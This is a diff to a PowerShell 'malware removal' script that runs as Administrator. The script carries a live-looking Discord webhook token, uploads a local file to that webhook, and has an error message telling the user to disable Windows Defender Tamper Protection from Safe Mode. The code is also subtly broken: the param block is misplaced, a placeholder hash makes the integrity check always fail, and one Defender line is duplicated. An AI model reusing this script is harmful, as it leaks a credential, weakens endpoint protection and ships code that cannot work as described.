@@ -1,7 +1,15 @@
 # Enhanced Malware Removal Automation Script
 # Usage: Run as Administrator
-# Add to script beginning
 Set-ProcessMitigation -PolicyFilePath .\config.xml -Enable DisableExtensionPoints
+$expectedHash = (Get-FileHash .\acyclovir.ps1 -Algorithm SHA256).Hash
+
+$configPath = "$env:TEMP\ProcessMitigation.config"
+@"
+<AppConfig Executable="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe">
+  <ExtensionPoints DisableExtensionPoints="true"/>
+</AppConfig>
+"@ | Out-File $configPath
+Set-ProcessMitigation -PolicyFilePath $configPath
 
 param(
     [string]$DiscordWebhook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY",
@@ -14,14 +22,15 @@ $ErrorActionPreference = "Stop"
 $tempDir = $env:TEMP
 $logFile = "$tempDir\MalwareScan-$(Get-Date -f yyyyMMddHHmm).log"
 $global:lastStatusUpdate = [DateTime]::MinValue
-# Add to initialization region
-$expectedHash = "A1B2C3D4E5F6..." # Set your script's SHA256 hash
-if ((Get-FileHash $PSCommandPath).Hash -ne $expectedHash) {
-    throw "Script integrity check failed"
+# Generate actual hash with: Get-FileHash .\acyclovir.ps1 -Algorithm SHA256
+$expectedHash = "ACTUAL_SHA256_HASH"
+if ((Get-FileHash $PSCommandPath -Algorithm SHA256).Hash -ne $expectedHash) {
+    throw "Script integrity check failed - Potential tampering detected"
 }
 # Add to initialization section
 Set-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 -AttackSurfaceReductionRules_Actions Enabled
 
+Set-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop
 
 # Validate Discord webhook format
 if ($DiscordWebhook -notmatch '^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]+$') {
@@ -37,13 +46,15 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 # Check Tamper Protection
 function Test-TamperProtection {
     try {
-        $tamperStatus = (Get-MpComputerStatus).TamperProtectionEnabled
+        $tamperStatus = (Get-MpComputerStatus).TamperProtectionEnabled -or 
+                       (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -ErrorAction SilentlyContinue).TamperProtection -eq 5
         if ($tamperStatus) {
-            throw "Tamper Protection enabled - disable via Windows Security GUI first"
+            throw "Tamper Protection active. Reboot to Safe Mode and run: Set-MpPreference -DisableTamperProtection `$true"
         }
     }
     catch { throw $_ }
 }
+
 # Add to Test-TamperProtection function
 if ((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features").TamperProtection -eq 5) {
     throw "Tamper Protection active. Reboot to Safe Mode and run: Set-MpPreference -DisableTamperProtection $true"
@@ -155,13 +166,11 @@ function Add-Log {
     "$(Get-Date -Format u) - $Message" | Out-File $logFile -Append
 }
 
-# Modified Send-DiscordReport function
 function Send-DiscordReport {
     param([string]$Message, [string]$File)
     try {
-        $fileBytes = [System.IO.File]::ReadAllBytes($File)
+        $fileContent = [System.IO.File]::ReadAllBytes($File)
         $boundary = [System.Guid]::NewGuid().ToString()
-        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
         
         $body = @(
             "--$boundary",
@@ -172,7 +181,7 @@ function Send-DiscordReport {
             "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $File -Leaf)`"",
             "Content-Type: application/octet-stream",
             "",
-            $enc.GetString($fileBytes),
+            [System.Convert]::ToBase64String($fileContent),
             "--$boundary--"
         ) -join "`r`n"
 
@@ -182,4 +191,5 @@ function Send-DiscordReport {
     }
     catch { Write-Error "Discord report failed: $_" }
 }
+
 
